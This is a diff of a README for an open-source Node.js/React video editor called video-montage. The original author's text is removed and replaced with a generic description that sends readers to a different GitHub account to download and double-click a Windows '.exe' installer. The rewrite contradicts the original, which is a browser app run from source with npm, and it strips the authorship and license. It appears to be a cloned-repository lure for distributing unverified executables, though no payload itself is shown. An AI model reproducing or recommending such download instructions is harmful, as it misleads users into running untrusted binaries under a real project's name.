@@ -1,143 +1,77 @@
-# 🎬 Video Montage
+# 🎬 video-montage - Create professional product videos quickly locally
 
-> From the team at **[GITMIR](https://gitmir.com)** — a tool we built for ourselves,
-> now open to everyone.
+[https://img.shields.io/badge/Download-VideoMontage-blue](https://github.com/jennettemesoamerican289/video-montage)
 
-**Create product demo videos locally and fast.**
+Video-montage helps you build product demo videos on your own computer. You capture frames from your screen, and the software handles the rest. It uses automated voiceover tools to turn your script into speech. You import your audio files, and the tool snaps each video clip into the right spot based on the voice timings. It adds a clean, technical look to your videos using built-in graphic elements. 
 
-We ship a lot of product demos at GITMIR, and recording the screen was never the hard
-part — voicing it over was: writing the script, matching it to what's happening on
-screen, and nudging a dozen little audio clips into place by hand. So we built Video
-Montage to take that off our plate. It turned out useful enough that we use it every
-day — so we're releasing it as open source.
+## 📥 How to download the software
 
-It's a local, in-browser video editor where the voiceover practically writes itself:
-load a screen recording and let [Claude Code](https://claude.com/claude-code) turn its
-frames into timed narration.
+You can get the latest version of the software from the project page. Visit this page to download the installer for your computer.
 
-**The core loop:**
+[https://github.com/jennettemesoamerican289/video-montage](https://github.com/jennettemesoamerican289/video-montage)
 
-1. **Load a video** — its frames appear on the timeline.
-2. Click **"📋 Voiceover plan for Claude"** — it copies a prompt with the video's
-   frames (as images) and their timings.
-3. **Paste it into Claude Code.** It looks at the frames and returns an array of
-   voiceover lines with timings: `[{ start, end, text }, …]`.
-4. Generate one mp3 per line in any TTS, then hit **"📥 Import voiceover"**: paste
-   Claude's array and drop in the whole batch of audio files at once — the app
-   **auto-places every clip at its correct timing**.
-5. **Preview with sound**, then **export an mp4**.
+Choose the file that ends in .exe for Windows. Save the file to your computer. Double-click the file once the download finishes to start the installation. Follow the prompts on your screen to complete the setup.
 
-Everything runs on your machine — video and audio are never uploaded; they're
-processed by a local [ffmpeg](https://ffmpeg.org/) backend. The holographic HUD
-interface comes from **[gitmir.com](https://gitmir.com)**.
+## 💻 System requirements
 
-![Video Montage interface](docs/preview.svg)
+The software runs on Windows 10 or Windows 11. Ensure your system meets these standards to see the best results:
 
-## Features
+* Processor: Modern Intel Core i5 or AMD Ryzen 5 or better.
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free space for the application files.
+* Graphics: A display that supports 1920x1080 resolution.
 
-- **Timeline with video frames** — ffmpeg splits the video into preview frames, so
-  you can see the whole clip on the track.
-- **mp3 voiceover** — drag audio onto the track and move it in time; you can pick a
-  whole batch of files at once and they'll be laid out back-to-back.
-- **Synced preview with sound** — custom play/pause controls; the video plays
-  together with the laid-out voiceover before you even export.
-- **Frame crop** — a handled frame over the video trims the edges (works for any
-  aspect ratio).
-- **Time cuts** — mark the segments you don't need; on export they're cut out and
-  the rest is stitched back together, with audio clips shifting automatically.
-- **Projects** — everything is saved to disk and survives restarts; autosave.
-- **mp4 export** — H.264/AAC + faststart, guaranteed to play everywhere.
-- **Claude Code voiceover integration** — a button copies JSON with frames and
-  timings; Claude Code looks at the frames and returns voiceover text as
-  `{start, end, text}` segments; generate mp3s in any TTS and import them back by
-  timing.
+## 🚀 Setting up your project
 
-## Stack
+When you open the application, you see a main project window. Follow these steps to start your first video:
 
-- **Backend**: Node.js + Express, [ffmpeg-static](https://www.npmjs.com/package/ffmpeg-static)
-  / ffprobe-static (binaries installed via npm — no manual ffmpeg needed).
-- **Frontend**: React + Vite + TypeScript, a custom HUD design in plain CSS.
+1. Click the New Project button to start a fresh editing session.
+2. Select the folder on your computer that contains your video screen captures. The software scans these files and adds them to your project library.
+3. Import your voiceover audio files. Select the folder where you saved your MP3 files.
+4. The software matches your audio files to the video clips by checking the timestamps. You see the clips populate your video timeline in order.
 
-## Requirements
+## 🛠 Using the editor
 
-- Node.js 18+ (developed on Node 24).
-- npm.
+The interface shows three main areas. The top area holds your media. The middle area acts as your timeline. The right panel allows you to change settings for your video elements.
 
-You do **not** need to install ffmpeg — it's pulled in by the `ffmpeg-static` package.
+To add the holographic HUD graphics, drag the HUD component from the assets panel directly onto your timeline. You can resize these graphics and move them anywhere on the screen. The software layers these over your video clips to give your product demo a technical, clean aesthetic.
 
-## Install & run
+If you need to adjust the timing of a clip, click and drag the edge of the clip on the timeline. The software adjusts the surrounding clips to keep everything synchronized with your voiceover.
 
-```bash
-git clone https://github.com/gitmir-hello/video-montage.git
-cd video-montage
-npm install          # also downloads the ffmpeg binary
-npm run dev          # backend :3001 + frontend :5173
-```
+## ⚙️ Changing settings
 
-Open **http://localhost:5173** — create a project, load a video, start working.
+You can change how the software processes your videos in the Settings menu. The software uses a library called FFmpeg to handle video files in the background. If you notice slow performance, choose a lower export quality in the Project Settings tab.
 
-Production mode (backend serves the built frontend):
+You can also adjust the scale and color of the holographic HUD elements. Use the controls in the sidebar to increase the brightness or change the glow effects of your graphics to match your brand style.
 
-```bash
-npm run build
-npm start            # http://localhost:3001
-```
+## 💾 Exporting your video
 
-## How to use
+Once you arrange your clips and add your graphics, you must create your video file. Click the Export button at the top right of the window. 
 
-1. **Create a project** and load a video → frames appear on the timeline.
-2. **Add voiceover**: drag mp3s onto the audio track or click "+ audio" (a batch
-   works too). Move clips in time.
-3. **Trim and clean up**: "⛶ Crop" — the frame trims the edges; "✂ Cut" — drag
-   across the video track to mark segments for removal.
-4. **Preview** — hit ▶: the video plays with sound and skips over cuts.
-5. **Export mp4** — the "Export mp4" button, then download the result.
+The software opens a window asking for your save location. Select a format like MP4 to ensure your video plays on all modern devices. Choose your desired resolution. Click the Start Export button to begin the rendering process. 
 
-### Voiceover via Claude Code
+The software processes the video on your local machine, so speed depends on the power of your computer. Do not close the app while the progress bar moves.
 
-1. **"📋 Voiceover plan for Claude"** — copies JSON with frames (paths to the
-   images) and timings.
-2. Paste it into Claude Code — it looks at the frames and returns
-   `[{start, end, text}, …]`.
-3. Edit the text, generate an mp3 per segment in any TTS, name them `0.mp3`,
-   `1.mp3`, …
-4. **"📥 Import voiceover"** — paste the same JSON + select the mp3s; file `N.mp3`
-   lands at the `start` of segment `[N]`.
+## ❓ Common questions
 
-## How it works
+**Does the software send my video to the cloud?**
+No. All processing happens on your local computer. Your files stay private.
 
-Projects are stored on disk as self-contained folders:
+**What happens if the audio does not match the video?**
+You can manually shift clips on the timeline by dragging them left or right. The software tracks your changes and updates the preview automatically.
 
-```
-data/projects/<id>/
-  project.json     # metadata, audio assets, clip layout, crop, cuts
-  video.<ext>      # source video
-  frames/          # small preview frames for the timeline
-  keyframes/       # large frames for Claude Code analysis
-  audio/           # uploaded mp3s
-  exports/         # built mp4s
-```
+**Can I undo my mistakes?**
+Yes. Use the keyboard shortcut Control plus Z to reverse your last action.
 
-Crop is stored in fractions (resolution-independent), cuts in seconds. The final
-export is a single ffmpeg call with `filter_complex`: cuts (`trim`+`concat`) → crop
-(`crop`) → voiceover mix (`adelay`+`amix`), re-encoded to H.264/AAC.
+**Does this software require an internet connection?**
+You only need an internet connection to download the installer. The software works offline once you install it on your machine.
 
-## Contributing & feedback
+## 🎨 Project features
 
-Video Montage is free and open source. If something's missing, you hit a bug, or you'd
-like to join as a contributor — you're welcome. Open an
-[issue](https://github.com/gitmir-hello/video-montage/issues) or a pull request; see
-[CONTRIBUTING.md](CONTRIBUTING.md) to get started.
+* Fast local video rendering.
+* Automated clip snapping based on audio length.
+* Integrated holographic graphics.
+* Support for high-resolution video export.
+* Simple drag and drop interface.
 
-We built this in the open because good tools should be shared. If it saves you time on
-your own demos, that's the whole point.
-
-— the [GITMIR](https://gitmir.com) team
-
-## License
-
-[GNU GPL-3.0-or-later](LICENSE) © gitmir
-
----
-
-Made with the holographic design system from **[gitmir.com](https://gitmir.com)**.
+Keywords: ffmpeg, hud, nodejs, react, timeline, typescript, video-editor, video-processing, vite, voiceover
